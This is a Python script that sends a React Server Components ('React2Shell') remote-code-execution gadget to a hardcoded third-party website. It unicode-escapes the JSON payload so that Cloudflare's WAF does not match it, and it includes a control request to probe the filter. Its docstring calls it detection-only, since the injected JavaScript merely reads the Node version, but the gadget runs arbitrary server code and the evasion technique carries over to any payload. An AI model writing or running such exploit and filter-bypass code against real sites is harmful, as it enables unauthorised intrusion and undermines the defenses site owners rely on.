#!/usr/bin/env python3
"""React2Shell WAF-evasion via JSON-level unicode escaping (semantics preserved).
CF appears to match the raw co-occurrence of the two chain tokens; escaping all
characters of those tokens (and of the JS prefix) changes raw bytes only.

Detection-only: the executed JS merely reads process.version and throws a
NEXT_REDIRECT carrying digest 'R2S_AUDIT_PROBE_<version>'. No shell, no files."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))
MARK = "R2S_AUDIT_PROBE_"


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    return "Attention Required" in b.decode("utf-8", "ignore")[:3000]


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def esc(s):
    """Escape every char as \\uXXXX (valid inside JSON strings)."""
    return "".join("\\u%04x" % ord(c) for c in s)


PREFIX = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'" + MARK + "'+res});")


def send(tag, p0, expect_marker=False):
    bnd = "----B" + rnd(30)
    body = (f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{p0}\r\n"
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{esc('$@0')}\r\n"
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
            f"--{bnd}--\r\n").encode()
    st, hd, b = req("POST", BASE + "/", headers={
        "Content-Type": f"multipart/form-data; boundary={bnd}",
        "Next-Action": rnd(40), "Accept": "text/x-component",
        "Origin": BASE, "Referer": BASE + "/"}, body=body)
    t = b.decode("utf-8", "ignore")
    print(f"[{tag}] HTTP {st} cf={is_cf(b)} marker={MARK in t} len={len(b)}")
    if st != 403:
        print("   body:", t[:300].replace("\n", " "))
    if MARK in t:
        i = t.find(MARK)
        print("   >>> DIGEST:", t[i:i + 150].replace("\n", " "))
    time.sleep(2)
    return st, t


req("GET", BASE + "/")
time.sleep(1)

# A) fully unicode-escaped gadget (all sensitive tokens + prefix escaped)
p0_full = ("{" + f'"{esc("then")}":"{esc("$1:__proto__:then")}",'
           f'"{esc("status")}":"{esc("resolved_model")}",'
           f'"{esc("reason")}":-1,'
           f'"{esc("value")}":"{esc(json.dumps({"then": "$B1337"}))}",'
           f'"{esc("_response")}":{{"{esc("_prefix")}":"{esc(PREFIX)}",'
           f'"{esc("_chunks")}":"{esc("$Q2")}",'
           f'"{esc("_formData")}":{{"{esc("get")}":"{esc("$1:constructor:constructor")}"}}}}}}')
send("A fully-escaped gadget", p0_full)

# B) control: same prefix but no constructor token (prefix itself must pass)
p0_ctl = ("{" + f'"{esc("then")}":"{esc("$1:__proto__:then")}",'
          f'"{esc("status")}":"{esc("resolved_model")}",'
          f'"{esc("reason")}":-1,'
          f'"{esc("value")}":"{esc(json.dumps({"then": "$B1337"}))}",'
          f'"{esc("_response")}":{{"{esc("_prefix")}":"{esc(PREFIX)}",'
          f'"{esc("_chunks")}":"{esc("$Q2")}",'
          f'"{esc("_formData")}":{{"{esc("get")}":"{esc("x")}"}}}}}}')
send("B escaped, no-ctor-token", p0_ctl)
